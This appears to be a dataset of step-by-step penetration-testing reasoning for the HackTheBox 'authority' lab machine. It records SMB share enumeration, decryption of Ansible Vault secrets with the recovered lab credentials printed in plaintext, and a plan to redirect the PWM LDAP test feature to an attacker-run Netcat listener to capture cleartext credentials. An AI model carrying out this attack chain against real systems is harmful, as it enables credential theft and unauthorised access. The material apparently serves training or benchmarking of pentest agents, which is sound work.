4. Enumerating the ""Development"" share could reveal useful information such as its contents, permissions, and potential vulnerabilities. This information could provide further insight into the target system and potentially provide a path for further exploitation.

5. Therefore, given the potential value of non-standard SMB shares and the findings from the previous steps, it is a logical next step to enumerate the ""Development"" share within the SMB service.","- NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share.
- The ""Development"" share was accessible and its contents were listed.
- The ""Development"" share contains a directory named ""Automation"".
- The ""Automation"" directory was downloaded recursively to a local directory for further examination.
- The ""Automation"" directory appears to contain Ansible playbook files.
- The target IP for SMB client is 10.10.11.222.",Download the content in the Development share and explore the file,"1. The intended task of the previous step was to enumerate the ""Development"" share within the SMB service, which was successfully achieved. The key findings include the fact that ""Development"" share was accessible and its contents were listed. Among the contents, a directory named ""Automation"" was found, which appears to contain Ansible playbook files.

2. The identification of the ""Automation"" directory and its contents as Ansible playbook files is a significant finding. Ansible playbooks are configuration and multinode deployment system files, which can contain sensitive information such as system configurations, privileged commands, or even credentials. This could potentially lead to further exploitation opportunities.

3. Given the findings from the previous step, it is reasonable to continue with the current strategy of SMB enumeration. Specifically, further exploration of the ""Automation"" directory and its contents could reveal more information about its contents and potential vulnerabilities. This could provide a potential entry point for further penetration testing steps.

4. Therefore, the selected strategy is to download the content in the ""Development"" share and explore the files. This will involve accessing the files and exploring its contents, which could potentially reveal sensitive information or additional vulnerabilities.","Explore the suspicious files, commands and create a summary of the findings.","1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified and accessed. The ""Development"" share contains a directory named ""Automation"" which appears to contain Ansible playbook files. This is a significant finding.

2. Ansible playbooks are configuration and multinode deployment system files. They can contain sensitive information such as system configurations, privileged commands, or even credentials. This makes the ""Automation"" directory and its contents a potential target for further exploration.

3. The selected step is to explore the suspicious files in the ""Development"" share. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Exploring the files could reveal useful information such as their contents, potential commands, and potential vulnerabilities. This information could provide further insight into the target system and potentially provide a path for further exploitation.

5. Therefore, given the potential value of the files in the ""Development"" share and the findings from the previous steps, it is a logical next step to explore the suspicious files, commands and create a summary of the findings.","{'Smb client': ""Explore the suspicious files in the 'Development' share."", 'Interactive CLI': 'Create a summary of the findings from the explored files.'}"
authority,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)",Download the content in the Development share and explore the file,"1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified and accessed. The ""Development"" share contains a directory named ""Automation"" which appears to contain Ansible playbook files. This is a significant finding.

2. Ansible playbooks are configuration and multinode deployment system files. They can contain sensitive information such as system configurations, privileged commands, or even credentials. This makes the ""Automation"" directory and its contents a potential target for further exploration.

3. The selected step is to explore the suspicious files in the ""Development"" share. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Exploring the files could reveal useful information such as their contents, potential commands, and potential vulnerabilities. This information could provide further insight into the target system and potentially provide a path for further exploitation.

5. Therefore, given the potential value of the files in the ""Development"" share and the findings from the previous steps, it is a logical next step to explore the suspicious files, commands and create a summary of the findings.","- The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box.
- A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target.
- The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"".
- The ""PWM"" directory was examined as the most likely target.
- The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file.
- The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed.",Further enumerate the found file,"1. The intended task of the previous step was to explore the contents of the ""Development"" share, specifically the ""Automation"" directory. This task was successfully achieved. The key findings include the fact that the ""Automation"" directory contains Ansible playbooks, which are used for configuration on the target box. Additionally, a share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. This file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed.

2. The identification of the Ansible playbooks and the 'tomcat-users.xml.j2' file is a significant finding. These files could contain sensitive information such as system configurations, privileged commands, or even credentials. However, the passwords found in the 'tomcat-users.xml.j2' file do not work for PWM and the Tomcat manager is not exposed, suggesting that further exploration is needed.

3. Given the findings from the previous step, it is reasonable to continue with the current strategy of SMB enumeration. Specifically, further exploration of the Ansible playbooks and the other files in the ""PWM"" directory could reveal more information about its contents and potential vulnerabilities. This could provide a potential entry point for further penetration testing steps.

4. Therefore, the selected strategy is to further enumerate the found files in the ""PWM"" directory. This will involve accessing the files and exploring its contents, which could potentially reveal sensitive information or additional vulnerabilities.","Explore the suspicious files, commands and create a summary of the findings.","1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified and accessed. The ""Development"" share contains a directory named ""Automation"" which appears to contain Ansible playbook files. This is a significant finding.

2. The Ansible playbooks are configuration and multinode deployment system files. They can contain sensitive information such as system configurations, privileged commands, or even credentials. This makes the ""Automation"" directory and its contents a potential target for further exploration.

3. The selected step is to further explore the suspicious files in the ""Development"" share. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Exploring the files could reveal useful information such as their contents, potential commands, and potential vulnerabilities. This information could provide further insight into the target system and potentially provide a path for further exploitation.

5. Therefore, given the potential value of the files in the ""Development"" share and the findings from the previous steps, it is a logical next step to explore the suspicious files, commands and create a summary of the findings.","{'Smb client': ""Explore the contents of the 'Development' share and access the 'Automation' directory."", 'Interactive CLI': 'Analyze the Ansible playbook files for sensitive information and potential vulnerabilities.'}"
authority,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)
       1.5.4 Further Explore ""PWM"" directory - {Findings: The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool. The PWM hostname is set as 'authority.htb.corp'. The PWM http and https ports are set to be variable. The PWM https is enabled. SSL requirement for PWM is set to false. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required} - (completed)",Further enumerate the found file,"1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified and accessed. The ""Development"" share contains a directory named ""Automation"" which appears to contain Ansible playbook files. This is a significant finding.

2. The Ansible playbooks are configuration and multinode deployment system files. They can contain sensitive information such as system configurations, privileged commands, or even credentials. This makes the ""Automation"" directory and its contents a potential target for further exploration.

3. The selected step is to further explore the suspicious files in the ""Development"" share. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Exploring the files could reveal useful information such as their contents, potential commands, and potential vulnerabilities. This information could provide further insight into the target system and potentially provide a path for further exploitation.

5. Therefore, given the potential value of the files in the ""Development"" share and the findings from the previous steps, it is a logical next step to explore the suspicious files, commands and create a summary of the findings.","- The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool.
- The PWM hostname is set as 'authority.htb.corp'.
- The PWM http and https ports are set to be variable.
- The PWM https is enabled.
- SSL requirement for PWM is set to false.
- The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault.
- To decrypt these secrets, the correct Ansible Vault password is required.",Crack the hashes and extract the passwords,"1. The intended task of the previous step was to further explore the files in the ""PWM"" directory of the ""Development"" share. This task was successfully achieved. The key findings include the fact that the 'defaults/main.yml' file contains configuration variables for the PWM (Password Management) tool. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required.

2. The identification of the encrypted passwords is a significant finding. These passwords could provide access to privileged accounts or services within the target system. However, the passwords are encrypted using Ansible Vault, and the correct Ansible Vault password is required to decrypt them. This suggests that further steps are needed to obtain the decrypted passwords.

3. Given the findings from the previous step, it is reasonable to continue with the current strategy of SMB enumeration and file exploration. Specifically, the next logical step is to attempt to crack the encrypted passwords. This could involve using a tool or technique to guess the Ansible Vault password, or to otherwise decrypt the encrypted passwords.

4. Therefore, the selected strategy is to crack the hashes and extract the passwords. This will involve using a tool or technique to guess the Ansible Vault password, or to otherwise decrypt the encrypted passwords. This could potentially reveal the plaintext passwords, which could provide access to privileged accounts or services within the target system.",Exploit the selected exploitations,"1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified and accessed. The ""PWM"" directory within the ""Development"" share contains ansible configuration files and templates, including a 'defaults/main.yml' file. This file contains encrypted passwords for the PWM admin login, PWM admin password, and LDAP admin password. These passwords are encrypted using Ansible Vault.

2. The identification of the encrypted passwords is a significant finding. These passwords could provide access to privileged accounts or services within the target system. However, to access these passwords, the correct Ansible Vault password is required to decrypt them.

3. The selected step is to exploit the discovered vulnerabilities, specifically by attempting to crack the hashes and extract the passwords. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Cracking the hashes and extracting the passwords could potentially reveal the plaintext passwords, which could provide access to privileged accounts or services within the target system. This could provide a path for further exploitation.

5. Therefore, given the potential value of the encrypted passwords and the findings from the previous steps, it is a logical next step to exploit the selected exploitations, specifically by attempting to crack the hashes and extract the passwords.","{'John-the-ripper': ""Crack the encrypted passwords found in the 'defaults/main.yml' file.""}"
authority,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)
       1.5.4 Further Explore ""PWM"" directory - {Findings: The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool. The PWM hostname is set as 'authority.htb.corp'. The PWM http and https ports are set to be variable. The PWM https is enabled. SSL requirement for PWM is set to false. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required} - (completed)
       1.5.5 Crack the hashes and extract the passwords - {Findings: Three encrypted files (vault1, vault2, vault3) were successfully decrypted using Ansible Vault. The decrypted content of vault1 is 'svc_pwm', which appears to be a username. The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password. The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password} - (completed)",Crack the hashes and extract the passwords,"1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified and accessed. The ""PWM"" directory within the ""Development"" share contains ansible configuration files and templates, including a 'defaults/main.yml' file. This file contains encrypted passwords for the PWM admin login, PWM admin password, and LDAP admin password. These passwords are encrypted using Ansible Vault.

2. The identification of the encrypted passwords is a significant finding. These passwords could provide access to privileged accounts or services within the target system. However, to access these passwords, the correct Ansible Vault password is required to decrypt them.

3. The selected step is to exploit the discovered vulnerabilities, specifically by attempting to crack the hashes and extract the passwords. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Cracking the hashes and extracting the passwords could potentially reveal the plaintext passwords, which could provide access to privileged accounts or services within the target system. This could provide a path for further exploitation.

5. Therefore, given the potential value of the encrypted passwords and the findings from the previous steps, it is a logical next step to exploit the selected exploitations, specifically by attempting to crack the hashes and extract the passwords.","- Three encrypted files (vault1, vault2, vault3) were successfully decrypted using Ansible Vault.
- The decrypted content of vault1 is 'svc_pwm', which appears to be a username.
- The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password.
- The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password.",Login to the PWM login pannel using the revealed credentials,"1. The intended task of the previous step was to crack the hashes and extract the passwords. This task was successfully achieved. The key findings include the decryption of three files (vault1, vault2, vault3) using Ansible Vault. The decrypted content of vault1 is 'svc_pwm', which appears to be a username. The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password. The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password.

2. The identification of the decrypted credentials is a significant finding. These credentials could potentially provide access to privileged accounts or services within the target system. Given these findings, further steps are needed to utilize these credentials.

3. Given the findings from the previous step, it is reasonable to continue with the current strategy of exploiting the discovered vulnerabilities. Specifically, the next logical step is to attempt to use the decrypted credentials to login to the PWM login panel. This could provide access to privileged accounts or services within the target system.

4. Therefore, the selected strategy is to login to the PWM login panel using the revealed credentials. This strategy is based on the potential access that these credentials could provide, and it follows logically from the successful decryption of the credentials in the previous step.",Exploit the selected exploitations,"1. The updated PTT reveals that the encrypted files (vault1, vault2, vault3) in the ""PWM"" directory of the ""Development"" share have been successfully decrypted using Ansible Vault. The decrypted content includes a username 'svc_pwm' and two passwords 'pwm_@dm!N_!23' and 'DevT3st@123'.

2. The identification of these decrypted credentials is a significant finding. These credentials could potentially provide access to privileged accounts or services within the target system. However, to access these accounts or services, the credentials need to be utilized.

3. The selected step is to exploit the discovered vulnerabilities, specifically by attempting to login to the PWM login panel using the revealed credentials. This step is logical because it follows the strategy of further exploiting potential vulnerabilities or access points identified in the previous steps.

4. Logging into the PWM login panel using the revealed credentials could potentially provide access to privileged accounts or services within the target system. This could provide a path for further exploitation.

5. Therefore, given the potential value of the decrypted credentials and the findings from the previous steps, it is a logical next step to exploit the selected exploitations, specifically by attempting to login to the PWM login panel using the revealed credentials.","{'Web page interaction': ""Attempt to login to the PWM login panel using the credentials 'svc_pwm' and passwords 'pwm_@dm!N_!23' and 'DevT3st@123'.""}"
authority,"Here is the updated Penetration Testing Tree (PTT):

1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services, The webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)
       1.5.4 Further Explore ""PWM"" directory - {Findings: The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool. The PWM hostname is set as 'authority.htb.corp'. The PWM http and https ports are set to be variable. The PWM https is enabled. SSL requirement for PWM is set to false. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required} - (completed)
       1.5.5 Crack the hashes and extract the passwords - {Findings: Three encrypted files (vault1, vault2, vault3) were successfully decrypted using Ansible Vault. The decrypted content of vault1 is 'svc_pwm', which appears to be a username. The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password. The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password} - (completed)
       1.5.6 Login to the PWM login panel using the revealed credentials - {Findings: Successful login was achieved on the PWM (Password Management) login panel} - (completed)",,,"The webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address.",Configure the LDAP teseting to probe our machine,"1. The intended task of the previous step was to login to the PWM login panel using the revealed credentials. This was successful, as the login to the PWM (Password Management) login panel was achieved.

2. The key findings from this successful login are the credentials 'svc_pwm' and 'pwm_@dm!N_!23'. These credentials were obtained by decrypting the Ansible Vault files. This successful login indicates that these credentials are valid and can be used to authenticate to the PWM service. Furthermore, the PWM service is configured to use LDAP for authentication, which is a protocol used for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network. 

3. LDAP is known to send credentials in cleartext over the network. Therefore, if we can trick the LDAP tester to connect to our own Netcat listener, we might be able to retrieve the cleartext credentials. This strategy would involve configuring the LDAP testing feature to probe our machine, and then capturing the network traffic to extract the credentials. This is a common technique used in penetration testing to exploit insecure LDAP configurations. Therefore, it makes sense to move forward with this strategy.",Exploit the selected exploitations,"1. The selected step is to exploit the identified vulnerabilities. In this case, the vulnerability lies in the LDAP tester feature of the webpage. The feature allows testing an LDAP connection by probing an IP address. This can be exploited by configuring the LDAP tester to probe the attacker's machine.

2. The chain-of-thoughts leading to this step starts with the successful login to the PWM login panel using the decrypted credentials. This indicates that the PWM service uses LDAP for authentication. LDAP is known to send credentials in cleartext over the network.

3. The next link in the chain is the fact that the webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address. This feature can be exploited by configuring it to probe our machine.

4. The final link in the chain is to use Netcat to listen on the attacker's machine. Netcat is a networking utility that can read and write data across network connections. By having Netcat listen on the attacker's machine, it can capture the network traffic sent by the LDAP tester, which potentially includes the cleartext credentials.

5. Therefore, the logical step is to exploit the identified vulnerability by configuring the LDAP tester to probe the attacker's machine and use Netcat to listen for the incoming network traffic. This could potentially allow the attacker to capture the cleartext credentials and gain further access to the system.","{'Netcat': ""Listen on the attacker's machine to capture network traffic from the LDAP tester.""}"
authority,"Here is the updated Penetration Testing Tree (PTT):

1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services, The webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address} - (completed)
